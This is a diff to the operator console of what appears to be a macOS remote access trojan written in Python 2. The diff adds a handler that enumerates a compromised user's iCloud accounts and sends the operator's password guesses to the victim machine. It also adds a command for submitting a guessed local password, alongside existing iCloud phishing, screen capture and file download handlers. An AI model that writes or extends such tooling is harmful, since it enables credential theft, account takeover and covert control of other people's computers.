@@ -375,6 +375,7 @@ def main():
 
                 elif data.startswith('appleIDPhishHelp'):
                     content = pickle.loads(data[16:])
+                    print data
                     if len(content[0]) > 0:
                         print "%sFound the following iCloud accounts.\n%s\nWhich would you like to use to phish current GUI user [%s]?" % (bluePlus, content[0], content[1])
                         appleID = content[0].split(' Apple ID: [')[1][:-2]
@@ -388,6 +389,24 @@ def main():
                     else:
                         print "Phishing [%s%s%s]" % (blue, username, endC)
                         nextcmd = "iCloudPhishFinal%s:%s" % (username, content[1])
+
+                elif data.startswith('appleIDsubmit'):
+                    content = pickle.loads(data[13:])
+                    if len(content[0]) > 0:
+                        print "%sFound the following iCloud accounts.\n%s\nWhich would you like to guess?" % (bluePlus, content[0])
+                        appleID = content[0].split(' Apple ID: [')[1][:-2]
+                        username = raw_input("Enter iCloud Account: ") or appleID
+                        if username == '':
+                            print 'No username specified, cancelling guess.'
+                            nextcmd = ''
+                        else:
+                            print "Selected [%s%s%s]" % (blue,username,endC)
+                            itestpass = raw_input("📟  Guess the password: ")
+                            print "Attempting [%s%s%s]" % (blue, username, endC)
+                            nextcmd = "submit_iCloud_pass:::%s:%s" % (username, itestpass)
+                    else:
+                        print "%sCouldn't find any iCloud accounts, cancelling.\n" % (red_minus)
+                        nextcmd = ''
 
                 elif data.startswith('screenCapture'):
                     screen = data[13:]
@@ -662,6 +681,12 @@ def main():
                         else:
                             remote_file = nextcmd[9:] #take path as stdin
                         nextcmd = 'download' + remote_file
+
+                    if nextcmd == "submit_local_pass":
+                        nextcmd+= ":::"+raw_input("👻  Enter the local password for user %s: " % client_name)
+
+                    if nextcmd == "submit_iCloud_pass":
+                        nextcmd = "appleIDsubmit"
 
                     if len(nextcmd) == 0:
                         nextcmd = "printf ''"
